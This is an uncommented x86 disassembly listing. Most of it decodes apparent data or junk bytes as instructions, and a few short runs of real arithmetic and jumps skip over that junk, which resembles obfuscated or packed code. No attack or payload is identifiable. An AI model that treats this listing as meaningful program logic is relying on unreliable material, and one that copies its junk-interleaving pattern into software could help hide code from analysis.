  419d26:	rol    DWORD PTR [eax-0x29a1f9ab],0xe
  419d2d:	pop    ds
  419d2e:	popf   
  419d2f:	mov    cl,0x61
  419d31:	jb     0x419d17
  419d33:	test   al,0x1
  419d35:	cdq    
  419d36:	and    bl,BYTE PTR [eax]
  419d38:	je     0x419cc9
  419d3a:	adc    al,dl
  419d3c:	dec    eax
  419d3d:	xchg   edx,eax
  419d3e:	inc    esp
  419d3f:	push   cs
  419d40:	cmp    al,0x41
  419d42:	push   ebp
  419d43:	fs xchg ecx,eax
  419d45:	fld    QWORD PTR [ecx-0x7ce1d37]
  419d4b:	mov    esi,DWORD PTR [edi+0x28]
  419d4e:	jl     0x419d25
  419d50:	ss mov bh,0x63
  419d53:	sub    ah,BYTE PTR [edx+0x2224fe16]
  419d59:	js     0x419dc3
  419d5b:	(bad)  
  419d5c:	ds xchg ecx,eax
  419d5e:	pop    eax
  419d5f:	add    ecx,DWORD PTR [ebx]
  419d61:	int    0x2b
  419d63:	mov    bh,0x82
  419d65:	in     al,dx
  419d66:	pavgb  mm5,mm1
  419d69:	mov    ch,0x6e
  419d6b:	fidivr WORD PTR [esi+ebx*4]
  419d6e:	ret    0xfe3f
  419d71:	sub    ecx,DWORD PTR [edi+0x5f]
  419d74:	sbb    al,BYTE PTR [edi+0x530b727d]
  419d7a:	jae    0x419d1b
  419d7c:	xchg   ebx,eax
  419d7d:	mov    ebp,0x92c4594c
  419d82:	out    0x44,eax
  419d84:	hlt    
  419d85:	mov    edi,0x49eeb2ed
  419d8a:	out    0xb,al
  419d8c:	sti    
  419d8d:	ja     0x419d9e
  419d8f:	scas   al,BYTE PTR es:[edi]
  419d90:	fnsave [edi+0x7e4334b9]
  419d96:	jae    0x419d65
  419d98:	cmp    dl,BYTE PTR [esi]
  419d9a:	popa   
  419d9b:	neg    DWORD PTR [ecx-0x7e]
  419d9e:	in     eax,0x7e
  419da0:	mov    cl,0x0
  419da2:	ins    DWORD PTR es:[edi],dx
  419da3:	(bad)  
  419da4:	push   0x60
  419da6:	push   0x81144477
  419dab:	shl    BYTE PTR [ebx],cl
  419dad:	and    al,0x76
  419daf:	aad    0x2c
  419db1:	test   DWORD PTR [ebp-0x68],ebx
  419db4:	test   al,0xf8
  419db6:	lahf   
  419db7:	jbe    0x419d80
  419db9:	mov    esi,0x74d0a213
  419dbe:	int    0x2b
  419dc0:	(bad)  [ecx+0x6e7a9813]
  419dc6:	cmp    cl,ch
  419dc8:	jmp    0x419daa
  419dca:	arpl   WORD PTR [edx],sp
  419dcc:	stos   BYTE PTR es:[edi],al
  419dcd:	push   esi
  419dce:	inc    esp
  419dcf:	icebp  
  419dd0:	add    ecx,edi
  419dd2:	mov    ebp,0x581b81b7
  419dd7:	rol    BYTE PTR [edi],0x37
  419dda:	mul    BYTE PTR [edx+ecx*1]
  419ddd:	in     eax,dx
  419dde:	adc    eax,0x8e4b1b3f
  419de3:	lea    ecx,[ecx]
  419de5:	sbb    al,0x26
  419de7:	xchg   edx,eax
  419de8:	push   0xd170ec3a
  419ded:	cmp    eax,0x674bba96
  419df2:	mov    edx,esi
  419df4:	inc    ecx
  419df5:	mov    al,0x96
  419df7:	xor    dh,BYTE PTR [eax+0x20]
  419dfa:	punpcklwd mm2,mm0
  419dfd:	es pusha 
  419dff:	jg     0x419dac
  419e01:	sub    BYTE PTR [ebx+ecx*2],dl
  419e04:	jno    0x419e6c
  419e06:	mov    edx,DWORD PTR [esp+0x24]
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	(bad)  
  419e4e:	and    ch,BYTE PTR [esi]
  419e50:	fst    QWORD PTR [ebx]
  419e52:	pop    ss
  419e53:	sar    BYTE PTR [esi-0x41413dcb],0x1e
  419e5a:	xchg   BYTE PTR [si-0x2857],cl
  419e5f:	call   FWORD PTR [ecx+0x21]
  419e62:	add    ebp,edi
  419e64:	mov    bh,0xeb
  419e66:	in     eax,0x6c
  419e68:	std    
  419e69:	fist   WORD PTR [ecx+0x58]
  419e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e6d:	mov    al,0xf
  419e6f:	test   ebp,edi
  419e71:	and    esp,DWORD PTR [ecx-0x26]
  419e74:	cmp    BYTE PTR [ebx-0x3ccbe34a],al
  419e7a:	xchg   BYTE PTR [eax],ah
  419e7c:	ss push ds
  419e7e:	add    BYTE PTR [ebx-0x5c],dh
  419e81:	push   esi
  419e82:	lods   al,BYTE PTR ds:[esi]
  419e83:	push   cs
  419e84:	jb     0x419e2f
  419e86:	fidivr WORD PTR [ebx-0x30]
  419e89:	and    esi,eax
  419e8b:	sbb    DWORD PTR [edi+eiz*8+0x66],esi
  419e8f:	retf   0xb006
  419e92:	out    0xdb,al
  419e94:	cmp    DWORD PTR [edi-0x77],eax
  419e97:	pop    esi
  419e98:	fstp   TBYTE PTR [ebx+0x1b]
  419e9b:	mov    ds:0x224cc5f6,al
  419ea0:	inc    esp
  419ea1:	call   0x37337a28
  419ea6:	xlat   BYTE PTR ds:[ebx]
  419ea7:	in     eax,dx
  419ea8:	shl    BYTE PTR ds:0x71c77b50,0x8d
  419eaf:	fs pop esp
  419eb1:	push   esi
  419eb2:	sub    BYTE PTR [edi],ch
  419eb4:	iret   
  419eb5:	iret   
  419eb6:	mov    al,0x35
  419eb8:	mov    esi,DWORD PTR [edx-0x20c7ffba]
  419ebe:	lods   al,BYTE PTR ds:[esi]
  419ebf:	sbb    BYTE PTR [esi-0x1d],al
  419ec2:	pop    es
  419ec3:	arpl   si,cx
  419ec5:	das    
  419ec6:	mov    bl,0x81
  419ec8:	inc    eax
  419ec9:	inc    esi
  419eca:	add    ch,BYTE PTR [esi]
  419ecc:	shl    BYTE PTR [ecx-0x3fdfd7bd],1
  419ed2:	and    cl,bl
  419ed4:	loopne 0x419f4e
  419ed6:	mov    dl,0x84
  419ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed9:	mov    ss,ebp
  419edb:	out    0x20,eax
  419edd:	lahf   
  419ede:	aam    0x43
  419ee0:	push   es
  419ee1:	jae    0x419ee1
  419ee3:	mov    al,0x38
  419ee5:	jno    0x419e8b
  419ee7:	imul   eax,DWORD PTR [edx-0x2f56b7d2],0xbe2aa8c0
  419ef1:	jg     0x419f3c
  419ef3:	jbe    0x419e97
  419ef5:	xchg   esi,eax
  419ef6:	mov    al,0x68
  419ef8:	xor    DWORD PTR [edx],ebp
  419efa:	mov    ds:0xe033d096,eax
  419eff:	dec    edi
  419f00:	clc    
  419f01:	inc    esp
  419f02:	loop   0x419f30
  419f04:	ret    
  419f05:	ds in  al,0x88
  419f08:	scas   al,BYTE PTR es:[edi]
  419f09:	inc    ecx
  419f0a:	adc    eax,edx
  419f0c:	popa   
  419f0d:	push   esi
  419f0e:	cwde   
  419f0f:	les    ebx,FWORD PTR [edx+0x5d]
  419f12:	cmp    al,0x58
  419f14:	sbb    eax,0xcdc29822
  419f19:	fistp  DWORD PTR [ecx+0xb]
  419f1c:	test   al,0xd7
  419f1e:	ja     0x419ea3
  419f20:	xchg   edx,eax
  419f21:	adc    al,0x17
  419f23:	or     eax,0x61143b4
  419f28:	pushf  
  419f29:	or     eax,0xad691841
  419f2e:	add    ch,BYTE PTR [ecx-0x80]
  419f31:	out    dx,eax
  419f32:	fnstcw WORD PTR [esi+0x30]
  419f35:	pusha  
  419f36:	(bad)  
  419f37:	in     eax,dx
  419f38:	sbb    eax,0x63863761
  419f3d:	(bad)  
  419f3e:	jl     0x419f19
  419f40:	sbb    BYTE PTR [eax-0x435a3220],dh
  419f46:	retf   
  419f47:	fs loop 0x419ed0
  419f4a:	and    ebp,DWORD PTR [edx-0x5366743a]
  419f50:	xchg   edi,eax
  419f51:	mov    dh,0xa7
  419f53:	adc    al,0x2e
  419f55:	xchg   esp,eax
  419f56:	xlat   BYTE PTR ds:[ebx]
  419f57:	adc    eax,0xeed64b08
  419f5c:	add    eax,0x10c61d8a
  419f61:	ds xor al,0xb3
  419f64:	xor    al,0x12
  419f66:	in     al,0x7f
  419f68:	ret    0x8f7d
  419f6b:	add    eax,0x98d9e093
  419f70:	add    cl,BYTE PTR [ecx-0x25]
  419f73:	stc    
  419f74:	stos   DWORD PTR es:[edi],eax
  419f75:	je     0x419fae
  419f77:	dec    ebp
  419f78:	cmp    DWORD PTR [ebp+0x1b],edi
  419f7b:	rol    BYTE PTR [edi+0x6e],0x9
  419f7f:	mov    bh,0x4d
  419f81:	daa    
  419f82:	push   DWORD PTR [eax]
  419f84:	cmc    
  419f85:	out    0x3,eax
  419f87:	fisubr DWORD PTR [eax+0x5501e3fc]
  419f8d:	lods   al,BYTE PTR ds:[esi]
  419f8e:	dec    esi
  419f8f:	inc    ecx
  419f90:	loopne 0x419fbb
  419f92:	(bad)  
  419f93:	stc    
  419f94:	or     eax,DWORD PTR [edi-0x60ee8190]
  419f9a:	pop    ebx
  419f9b:	xor    esp,ebx
  419f9d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f9f:	lds    edx,FWORD PTR [ecx+0x25525de4]
  419fa5:	es xchg ecx,eax
  419fa8:	mov    BYTE PTR [ebp-0x342d9a33],al
  419fae:	xchg   edi,eax
  419faf:	jmp    0x419fc4
  419fb1:	sub    DWORD PTR [ebp-0x1582e904],eax
  419fb7:	mov    ebp,0xfe985da2
  419fbc:	aaa    
  419fbd:	sbb    DWORD PTR [edx-0x73281157],0x8e35bb3e
  419fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc8:	ja     0x41a025
  419fca:	out    dx,eax
  419fcb:	test   al,0xef
  419fcd:	shl    DWORD PTR [ebx],0xf6
  419fd0:	in     eax,dx
  419fd1:	and    DWORD PTR [ecx+0x73],esp
  419fd4:	sbb    al,0x4d
  419fd6:	loop   0x41a055
  419fd8:	aad    0xc4
  419fda:	in     eax,dx
  419fdb:	in     eax,dx
  419fdc:	mov    edx,0x65e855b8
  419fe1:	dec    esi
  419fe2:	mov    ch,0x34
  419fe4:	mov    ah,0xca
  419fe6:	xchg   ebx,eax
  419fe7:	(bad)  
  419fe8:	aam    0x3f
  419fea:	adc    DWORD PTR [ecx],ecx
  419fec:	jge    0x419f8c
  419fee:	(bad)  
  419fef:	cli    
  419ff0:	jb     0x41a03a
  419ff2:	mov    eax,0xaf3468b5
  419ff7:	dec    edi
  419ff8:	in     al,0x47
  419ffa:	sub    al,0x7f
  419ffc:	push   edi
  419ffd:	in     al,0x71
  419fff:	stos   DWORD PTR es:[edi],eax
  41a000:	fdivr  st,st(0)
  41a002:	aam    0x42
  41a004:	push   ecx
  41a005:	ds stos BYTE PTR es:[edi],al
  41a007:	cmc    
  41a008:	retf   0xab24
  41a00b:	imul   edx,DWORD PTR [ecx+0x617f1bb2],0x76
  41a012:	nop
  41a013:	adc    eax,DWORD PTR [edx-0x7c66d6d1]
  41a019:	das    
  41a01a:	das    
  41a01b:	xor    al,0x50
  41a01d:	int    0x22
  41a01f:	stc    
  41a020:	ret    0xc922
  41a023:	cs aaa 
  41a025:	dec    esp
  41a026:	sbb    esi,DWORD PTR [ebx]
  41a028:	push   ss
  41a029:	jbe    0x419fe3
  41a02b:	retf   0x75f0
  41a02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a02f:	pop    eax
  41a030:	call   0xd323:0xfcb01f98
  41a037:	push   ds
  41a038:	inc    ebx
  41a039:	in     eax,dx
  41a03a:	xchg   esp,eax
  41a03b:	pop    es
  41a03c:	push   eax
  41a03d:	and    bl,al
  41a03f:	pop    edx
  41a040:	adc    al,0x41
  41a042:	stos   DWORD PTR es:[edi],eax
  41a043:	cmp    edx,edx
  41a045:	sbb    al,0xd0
  41a047:	in     eax,0x16
  41a049:	pop    es
  41a04a:	pop    ebp
  41a04b:	dec    ecx
  41a04c:	out    dx,al
  41a04d:	test   eax,0xd0c9f34b
  41a052:	sbb    DWORD PTR [esi-0x4119d763],ebp
  41a058:	cld    
  41a059:	dec    ebp
  41a05a:	dec    ebx
  41a05b:	add    al,dl
  41a05d:	(bad)  
  41a05e:	call   0xe061f23
  41a063:	inc    edx
  41a064:	xor    eax,DWORD PTR [eax+0x74e245c5]
  41a06a:	fdivr  QWORD PTR [ebx+0x61acc5a5]
  41a070:	pop    ebp
  41a071:	dec    eax
  41a072:	and    al,0x70
  41a074:	dec    esp
  41a075:	neg    edx
  41a077:	push   ds
  41a078:	xor    eax,0x7abbf16a
  41a07d:	xor    dh,BYTE PTR [esi+0x28]
  41a080:	add    bh,bh
  41a082:	xchg   BYTE PTR [esi+edx*4],dl
  41a085:	(bad)
  41a088:	mov    ds:0x6b57f459,al
  41a08d:	jmp    0x6c82138d
  41a092:	repnz cdq 
  41a094:	dec    edi
  41a095:	out    0x60,al
  41a097:	rol    DWORD PTR [esi+0x2d1ac0f],cl
  41a09d:	xor    ecx,eax
  41a09f:	mov    eax,DWORD PTR [esp+0x18]
  41a0a3:	shr    edx,0x2
  41a0a6:	mov    edx,DWORD PTR [esp+0x1c]
  41a0aa:	xor    edx,edx
  41a0ac:	jmp    0x41a309
  41a0b1:	scas   ax,WORD PTR es:[edi]
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	ror    edi,1
  41a0be:	shr    DWORD PTR [edx],0xd1
  41a0c1:	mov    ebx,DWORD PTR [ebx]
  41a0c3:	sar    BYTE PTR [esi-0x41413dcb],0xcd
  41a0ca:	out    0x76,eax
  41a0cc:	fucomi st,st(4)
  41a0ce:	sub    esi,DWORD PTR [ebx-0x26]
  41a0d1:	std    
  41a0d2:	popa   
  41a0d3:	jmp    0x41a0b7
  41a0d5:	mov    esi,0x3f86facd
  41a0da:	lahf   
  41a0db:	adc    al,BYTE PTR ss:[edx]
  41a0de:	xor    eax,0x2fc507d0
  41a0e3:	std    
  41a0e4:	cs retf 
  41a0e6:	test   esi,ecx
  41a0e8:	in     eax,0x4d
  41a0ea:	sbb    eax,0x30a2ef3d
  41a0ef:	sub    dl,BYTE PTR [edi+0x2db5fbc8]
  41a0f5:	arpl   WORD PTR [eax+0x6c],bp
  41a0f8:	pop    ebx
  41a0f9:	imul   eax,DWORD PTR [esi],0xffffffc3
  41a0fc:	cld    
  41a0fd:	adc    BYTE PTR [esi+0x48],cl
  41a100:	ins    DWORD PTR es:[edi],dx
  41a101:	fcom   DWORD PTR [eax]
  41a103:	outs   dx,BYTE PTR ds:[esi]
  41a104:	inc    ecx
  41a105:	fwait
  41a106:	push   ss
  41a107:	or     al,0xe6
  41a109:	xor    al,0x8d
  41a10b:	fldenv [edx]
  41a10d:	test   esi,0x48dc5267
  41a113:	and    al,0x8e
  41a115:	xor    BYTE PTR [ecx+0x24],bl
  41a118:	(bad)  
  41a119:	sbb    DWORD PTR ds:0xee36b4ae,eax
  41a11f:	ins    DWORD PTR es:[edi],dx
  41a120:	mov    ebp,0xc3b33d6
  41a125:	and    eax,0x6a3ad1a5
  41a12a:	push   edi
  41a12b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a12c:	into   
  41a12d:	fistp  QWORD PTR [ebp-0x403c720a]
  41a133:	sub    bl,ch
  41a135:	iret   
  41a136:	jae    0x41a115
  41a138:	add    bl,ah
  41a13a:	stc    
  41a13b:	cld    
  41a13c:	jo     0x41a12b
  41a13e:	jbe    0x41a18f
  41a140:	call   0x1506:0x1c0fbe64
  41a147:	es push edi
  41a149:	mov    dl,0x83
  41a14b:	xchg   ebp,eax
  41a14c:	scas   eax,DWORD PTR es:[edi]
  41a14d:	adc    al,0xf
  41a14f:	sub    BYTE PTR ds:0x3688a837,bh
  41a155:	jne    0x41a145
  41a157:	aas    
  41a158:	nop
  41a159:	into   
  41a15a:	inc    esi
  41a15b:	push   es
  41a15c:	pusha  
  41a15d:	xchg   esp,eax
  41a15e:	sahf   
  41a15f:	pushf  
  41a160:	push   ds
  41a161:	mov    dh,0x4f
  41a163:	push   ecx
  41a164:	ret    0x8d3e
  41a167:	jmp    0xdc8e:0x4ca0aee2
  41a16e:	inc    ebp
  41a16f:	dec    edx
  41a170:	sti    
  41a171:	(bad)  
  41a172:	jno    0x41a0fa
  41a174:	stos   DWORD PTR es:[edi],eax
  41a175:	mov    ds:0x9bac12cd,al
  41a17a:	sub    al,0x2
  41a17c:	mov    bl,0x5d
  41a17e:	hlt    
  41a17f:	push   esp
  41a180:	add    al,0x23
  41a182:	fmul   QWORD PTR [edx]
  41a184:	dec    esp
  41a185:	add    DWORD PTR [ecx-0x55],ebx
  41a188:	jge    0x41a1d7
  41a18a:	jmp    0xaaa2b238
  41a18f:	repnz and bh,al
  41a192:	add    ecx,esp
  41a194:	dec    edi
  41a195:	outs   dx,BYTE PTR ds:[esi]
  41a196:	xchg   edi,eax
  41a197:	or     dh,BYTE PTR [edi-0x1be44398]
  41a19d:	les    ebp,FWORD PTR [ebx-0x56889e64]
  41a1a3:	xchg   ebp,eax
  41a1a4:	xor    al,BYTE PTR [ebx]
  41a1a6:	test   ebp,ecx
  41a1a8:	daa    
  41a1a9:	push   ebx
  41a1aa:	jmp    0x5effc2e3
  41a1af:	cdq    
  41a1b0:	cmp    ecx,edi
  41a1b2:	jle    0x41a212
  41a1b4:	loop   0x41a16f
  41a1b6:	(bad)  
  41a1b7:	out    0x78,eax
  41a1b9:	cmp    bh,BYTE PTR [edx-0x67]
  41a1bc:	stos   BYTE PTR es:[edi],al
  41a1bd:	adc    ebx,ebp
  41a1bf:	or     eax,DWORD PTR [ebx-0x6e70007f]
  41a1c5:	sub    eax,0x720e8a98
  41a1ca:	dec    ecx
  41a1cb:	rcl    BYTE PTR [ebx-0x57e9fe03],0xa8
  41a1d2:	sbb    ecx,DWORD PTR [ebp-0x4a]
  41a1d5:	dec    ebx
  41a1d6:	call   0x4c7d0f08
  41a1db:	cwde   
  41a1dc:	dec    ebx
  41a1dd:	in     eax,dx
  41a1de:	add    eax,0x24189b85
  41a1e3:	clc    
  41a1e4:	add    al,0x65
  41a1e6:	pop    ebp
  41a1e7:	inc    esp
  41a1e8:	mov    DWORD PTR [eax-0x54],eax
  41a1eb:	adc    DWORD PTR [ebx+0x1ee5259d],ecx
  41a1f1:	fisub  WORD PTR [eax-0x116087ee]
  41a1f7:	xchg   esi,eax
  41a1f8:	adc    eax,0xad148fd5
  41a1fd:	stos   BYTE PTR es:[edi],al
  41a1fe:	adc    ebp,edi
  41a200:	sub    DWORD PTR [ebp+0x7c],esp
  41a203:	test   cl,ah
  41a205:	imul   ebp,DWORD PTR [eax-0x56],0x60
  41a209:	mov    bl,0x67
  41a20b:	or     bh,al
  41a20d:	fucom  st(4)
  41a20f:	jle    0x41a1ae
  41a211:	jns    0x41a22c
  41a213:	sub    al,0x4e
  41a215:	sti    
  41a216:	call   0x4218:0x682b70ba
  41a21d:	jae    0x41a237
  41a21f:	lods   eax,DWORD PTR ds:[esi]
  41a220:	gs dec ebp
  41a222:	nop
  41a223:	dec    eax
  41a224:	pop    edi
  41a225:	xchg   esp,eax
  41a226:	cmp    eax,0xbc7af1b4
  41a22b:	cmp    eax,0xc7eb17e
  41a230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a231:	inc    ecx
  41a232:	aad    0x77
  41a234:	jmp    FWORD PTR [edx+0x1b]
  41a237:	cdq    
  41a238:	shr    BYTE PTR [edx],0x20
  41a23b:	mov    bh,ah
  41a23d:	out    0xfa,eax
  41a23f:	stc    
  41a240:	ficomp DWORD PTR [edx+0x3cd149a9]
  41a246:	inc    ebp
  41a247:	mov    ebp,0x43357513
  41a24c:	mov    bl,0x16
  41a24e:	xor    al,0x7e
  41a250:	sub    DWORD PTR [ebp+0x5f7ec3b0],esi
  41a256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a257:	aad    0xb8
  41a259:	and    ah,ah
  41a25b:	femms  
  41a25d:	push   ebx
  41a25e:	stc    
  41a25f:	arpl   WORD PTR [esi-0x5c301556],bx
  41a265:	mov    bh,0x74
  41a267:	dec    edx
  41a268:	cs sti 
  41a26a:	or     dh,BYTE PTR [ebx+0x13]
  41a26d:	adc    edi,ebp
  41a26f:	loopne 0x41a2bb
  41a271:	adc    dh,BYTE PTR [edi]
  41a273:	ins    DWORD PTR es:[edi],dx
  41a274:	push   cs
  41a275:	inc    edx
  41a276:	xchg   ebp,eax
  41a277:	lods   al,BYTE PTR ds:[esi]
  41a278:	mov    ebx,0x6473b3c0
  41a27d:	mov    ?,WORD PTR [esp+esi*8]
  41a280:	adc    BYTE PTR [ebp+ebp*8+0x1554627],cl
  41a287:	push   ebp
  41a288:	push   cs
  41a289:	lahf   
  41a28a:	sub    BYTE PTR [ebx],dl
  41a28c:	loopne 0x41a28b
  41a28e:	repz std 
  41a290:	mov    DWORD PTR [ebp+0x77],eax
  41a293:	and    BYTE PTR [edx+0x3],dl
  41a296:	sbb    DWORD PTR [esi],ecx
  41a298:	mov    dh,0x1c
  41a29a:	adc    dh,0x71
  41a29d:	fimul  DWORD PTR es:[esi*8+0x3e3e34eb]
  41a2a5:	jmp    0x41a25f
  41a2a7:	cmp    DWORD PTR [ecx],ebx
  41a2a9:	xchg   esp,eax
  41a2aa:	mov    al,ds:0x24be2e60
  41a2af:	rcr    BYTE PTR [edx-0x61],0x3f
  41a2b3:	pushf  
  41a2b4:	fcomp  DWORD PTR [esi-0x6b]
  41a2b7:	push   0xe82e38a7
  41a2bc:	pop    ecx
  41a2bd:	cmp    bh,BYTE PTR [ebx+0xa]
  41a2c0:	xor    eax,DWORD PTR [ebx-0x4515d631]
  41a2c6:	popa   
  41a2c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c8:	fwait
  41a2c9:	pop    esp
  41a2ca:	cwde   
  41a2cb:	pop    edx
  41a2cc:	sbb    DWORD PTR [esi+ecx*1-0x78db7124],0x56349270
  41a2d7:	adc    eax,0xa337aada
  41a2dc:	dec    ebx
  41a2dd:	retf   
  41a2de:	adc    esi,DWORD PTR [edi+0x55]
  41a2e1:	(bad)  
  41a2e3:	xchg   BYTE PTR [edi],ah
  41a2e5:	xchg   ecx,eax
  41a2e6:	or     DWORD PTR [esi-0x740fe794],0xcb1875dd
  41a2f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2f1:	jl     0x41a30a
  41a2f3:	mov    ah,0xc4
  41a2f5:	mov    ds:0xd0031200,eax
  41a2fa:	addr16 pop esi
  41a2fc:	push   edx
  41a2fd:	adc    al,0x36
  41a2ff:	xchg   esp,eax
  41a300:	sbb    DWORD PTR [edx],esp
  41a302:	ret    
  41a303:	sbb    ah,bh
  41a305:	je     0x41a2c9
  41a307:	adc    ecx,edi
  41a309:	or     edx,ecx
  41a30b:	push   edx
  41a30c:	push   esi
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	mov    esp,0x4cf8099
  41a37a:	pop    ds
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0x5d
  41a382:	add    eax,0x6c53c1c3
  41a387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a388:	ja     0x41a3dd
  41a38a:	pop    eax
  41a38b:	std    
  41a38c:	aam    0x55
  41a38e:	fnstsw ax
  41a390:	add    al,0xf8
  41a392:	fidiv  DWORD PTR [eax-0x51]
  41a395:	sti    
  41a396:	cmp    BYTE PTR [esi-0x6e],bl
  41a399:	or     eax,0x38f48fde
  41a39e:	shr    dl,cl
  41a3a0:	xchg   esi,eax
  41a3a1:	and    ebx,ebx
  41a3a3:	cwde   
  41a3a4:	fnstsw WORD PTR [edx]
  41a3a6:	adc    al,0xbf
  41a3a8:	lods   al,BYTE PTR ds:[esi]
  41a3a9:	inc    ebp
  41a3aa:	inc    eax
  41a3ab:	mov    cl,0xfb
  41a3ad:	in     eax,0x8a
  41a3af:	xlat   BYTE PTR ds:[ebx]
  41a3b0:	(bad)  
  41a3b1:	and    BYTE PTR [ebx-0x31],bl
  41a3b4:	clc    
  41a3b5:	xor    esp,DWORD PTR [eax+0x56]
  41a3b8:	dec    ecx
  41a3b9:	bound  ebx,QWORD PTR [ebx-0x22ce6627]
  41a3bf:	es int3 
  41a3c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3c2:	push   esi
  41a3c3:	ins    BYTE PTR es:[edi],dx
  41a3c4:	mov    ecx,0xe3ff8024
  41a3c9:	ret    0x9170
  41a3cc:	mov    BYTE PTR [edx-0x2eac8b28],0xc8
  41a3d3:	enter  0xdcd,0x4e
  41a3d7:	mov    dh,0x7e
  41a3d9:	jle    0x41a40d
  41a3db:	push   edx
  41a3dc:	xchg   ebp,eax
  41a3dd:	ins    BYTE PTR es:[edi],dx
  41a3de:	fld    DWORD PTR [edi+0x62]
  41a3e1:	cmp    DWORD PTR [esi],esp
  41a3e3:	jne    0x41a3c6
  41a3e5:	cmp    ebx,DWORD PTR [eax+ebx*8]
  41a3e8:	push   0xffffff90
  41a3ea:	push   ds
  41a3eb:	les    edx,FWORD PTR [bx+di-0x73a3]
  41a3f0:	popf   
  41a3f1:	aas    
  41a3f2:	sub    DWORD PTR [ecx+0xe],esi
  41a3f5:	(bad)  
  41a3f6:	loope  0x41a3bd
  41a3f8:	test   BYTE PTR [ecx+0x46],ah
  41a3fb:	cwde   
  41a3fc:	dec    esi
  41a3fd:	lds    esi,FWORD PTR [ebp+0x1fb157d8]
  41a403:	shr    dh,1
  41a405:	dec    ebp
  41a406:	lea    eax,[ebx+0x49280428]
  41a40c:	pop    ss
  41a40d:	sbb    eax,0xb45d6a95
  41a412:	(bad)  
  41a413:	xor    eax,0x6d9f0507
  41a418:	sub    edi,DWORD PTR [ecx]
  41a41a:	xchg   ebp,eax
  41a41b:	adc    BYTE PTR [esi+0x2a33f08],dl
  41a421:	fwait
  41a422:	push   0x9cf76263
  41a427:	dec    BYTE PTR [eax-0x71a2dd51]
  41a42d:	enter  0xdec8,0x80
  41a431:	sti    
  41a432:	fbstp  TBYTE PTR [edi]
  41a434:	xor    ecx,DWORD PTR [esi]
  41a436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a437:	stos   BYTE PTR es:[edi],al
  41a438:	mov    ?,WORD PTR [eax]
  41a43a:	sub    DWORD PTR [edx-0x148f938c],esp
  41a440:	sti    
  41a441:	xor    cl,BYTE PTR [ebp-0x148f9db6]
  41a447:	imul   eax,DWORD PTR [ebp-0x3c],0x33
  41a44b:	adc    edi,esp
  41a44d:	adc    eax,0x8150ac0b
  41a452:	add    DWORD PTR [esi+0x2b9c6ffa],ebx
  41a458:	inc    edi
  41a459:	jns    0x41a49e
  41a45b:	sbb    DWORD PTR [edi+ebx*8-0x1d],0x4d
  41a460:	sti    
  41a461:	fwait
  41a462:	push   0x1d5d0c09
  41a467:	add    DWORD PTR [ecx-0x27],ecx
  41a46a:	mov    ebp,0x492c77e2
  41a46f:	jmp    0x321fd730
  41a474:	inc    esp
  41a475:	sub    edx,DWORD PTR ds:0x32aea3b2
  41a47b:	adc    DWORD PTR [ecx],ebp
  41a47d:	ret    0x2a29
  41a480:	pop    edi
  41a481:	sub    BYTE PTR [esi+0x539ec50],al
  41a487:	ja     0x41a459
  41a489:	jne    0x41a432
  41a48b:	mov    ecx,0xf1e1bb3e
  41a490:	leave  
  41a491:	push   esi
  41a492:	sbb    dl,BYTE PTR [ecx]
  41a494:	inc    esi
  41a495:	xchg   edi,eax
  41a496:	xchg   ebx,eax
  41a497:	xor    edi,esi
  41a499:	xchg   ecx,eax
  41a49a:	cmp    al,BYTE PTR [ebp+0x34e4ebd1]
  41a4a0:	jmp    0x41a4bd
  41a4a2:	in     al,0x10
  41a4a4:	xchg   esp,eax
  41a4a5:	(bad)  
  41a4a7:	and    al,0xa6
  41a4a9:	xchg   edx,eax
  41a4aa:	addr16 (bad) 
  41a4ac:	sti    
